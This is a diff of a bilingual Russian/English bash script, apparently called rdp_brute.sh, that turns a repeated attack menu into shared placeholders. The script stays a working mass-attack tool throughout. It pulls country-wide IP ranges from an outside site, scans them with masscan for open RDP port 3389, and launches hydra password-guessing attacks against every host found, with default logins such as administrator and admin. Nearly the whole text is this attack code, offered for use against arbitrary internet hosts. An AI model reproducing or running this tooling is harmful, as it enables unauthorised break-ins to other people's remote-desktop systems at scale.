-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -15043,6 +5981,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -15052,53 +5991,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -15116,6 +6009,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -15126,52 +6020,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "204" ]; then
 curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -15187,6 +6036,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -15197,53 +6047,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 if [ "$menuoption" = "5" ]; then
  
 exit
@@ -15474,6 +6278,7 @@ read -p "   Сhoose from a menu : " menuoption
 if [ "$menuoption" = "1" ]; then
 read -p " Enter the IP range {192.168.0.0/24,192.168.0.0-192.168.0.255} : " target
 masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 echo ""
 echo "Addresses open port 3389:"
 cat open3389
@@ -15485,59 +6290,14 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 
 if [ "$menuoption" = "2" ]; then
 
 read -p " Enter the path to the file {list.txt,list..& etc.} : " listname
 masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 echo ""
 echo "
 Addresses open port 3389:"
@@ -15550,53 +6310,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 
 if [ "$menuoption" = "3" ]; then
@@ -15607,53 +6321,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$menuoption" = "4" ]; then
 echo "1.   Afghanistan";
@@ -15875,6 +6543,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -15885,52 +6554,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 
 if [ "$country" = "2" ]; then
@@ -15947,6 +6571,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -15957,53 +6582,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "3" ]; then
 curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -16019,6 +6598,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
@@ -16030,53 +6610,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "4" ]; then
@@ -16093,6 +6627,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16103,52 +6638,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "5" ]; then
 curl http://ipdiapazon.16mb.com/Andorra.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -16164,6 +6654,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16174,52 +6665,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 
 if [ "$country" = "6" ]; then
@@ -16236,6 +6682,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16246,52 +6693,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "7" ]; then
 curl http://ipdiapazon.16mb.com/Anguilla.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -16307,6 +6709,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16317,52 +6720,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "8" ]; then
 curl http://ipdiapazon.16mb.com/Antigua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -16378,6 +6736,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16387,53 +6746,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
